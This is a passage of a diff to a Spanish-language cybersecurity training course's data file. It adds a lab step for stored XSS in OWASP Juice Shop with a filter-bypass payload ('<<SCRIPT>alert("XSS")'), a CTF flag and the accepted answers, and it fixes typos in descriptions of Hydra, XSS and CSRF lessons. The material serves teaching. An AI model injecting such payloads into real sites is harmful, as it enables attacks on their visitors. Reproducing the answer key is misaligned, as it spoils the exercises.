+   <<SCRIPT>alert("XSS");//<</SCRIPT>
+4. Haz clic en el botón "Submit" para publicar el comentario.
+5. Cierra la ventana y vuelve a hacer clic en el mismo producto: verás que la alerta "XSS" se ejecuta de forma persistente.
+
+¿Por qué funcionó este truco?: El filtro eliminó la palabra <SCRIPT>, pero al haberla duplicado (<<SCRIPT>), al borrar la primera quedó una etiqueta válida de apertura que el navegador ejecutó.`,
+            payload: '<<SCRIPT>alert("XSS");//<</SCRIPT>',
+            flag: 'FLAG{juice-xss-stored-review-persists}',
+            dondeEncontrarla: 'En la sección de Reviews de un producto en Juice Shop tras recargar la página.',
+            quePoner: 'Escribe el texto de la alerta ejecutada desde la reseña: XSS',
+            flagsAceptadas: ["XSS", "xss", "FLAG{juice-xss-stored-review-persists}"],
+            objetivoFlag: 'Ingresa la flag cuando al volver a la pagina del producto (o recargarla) el alert "XSS" se dispare automaticamente desde la resena guardada en la base de datos.'
           }
         ]
       }
@@ -454,7 +1250,7 @@ export const RUTA_GLOBAL_TEMATICAS = [
     titulo: 'Pruebas Automaticas de Contrasenas',
     categoria: 'Autenticacion',
     nivel: 'Basico',
-    descripcion: 'Entendreras como se prueban miles de contrasenas de forma automatica con programas como Hydra y por que es vital usar claves seguras.',
+    descripcion: 'Entendras como se prueban miles de contrasenas de forma automatica con programas como Hydra y por que es vital usar claves seguras.',
     duracionEstimada: '15 min',
     tags: ['Hydra', 'Fuerza Bruta', 'Cookies de Sesion'],
   },
@@ -550,7 +1346,7 @@ export const RUTA_GLOBAL_TEMATICAS = [
     titulo: 'Codigo Malicioso Permanente (XSS Almacenado)',
     categoria: 'Inyeccion Web (XSS)',
     nivel: 'Intermedio',
-    descripcion: 'Entendreras el peligro de guardar comentarios con codigo malicioso que se activa automaticamente cada vez que alguien visita la pagina.',
+    descripcion: 'Entendras el peligro de guardar comentarios con codigo malicioso que se activa automaticamente cada vez que alguien visita la pagina.',
     duracionEstimada: '20 min',
     tags: ['XSS Stored', 'Persistencia', 'Bypass HTML Client-Side'],
   },
@@ -630,7 +1426,7 @@ export const RUTA_GLOBAL_TEMATICAS = [
     titulo: 'Acciones Forzadas en Cuentas Ajenas (CSRF)',
     categoria: 'Ataques de Sesion (CSRF)',
     nivel: 'Intermedio',
-    descripcion: 'Entendreras como una pagina trampa puede obligar al navegador de una victima a cambiar su contrasena sin su consentimiento.',
+    descripcion: 'Entendras como una pagina trampa puede obligar al navegador de una victima a cambiar su contrasena sin su consentimiento.',
     duracionEstimada: '20 min',
     tags: ['CSRF', 'Session Hijacking', 'Exploit HTML'],
   },
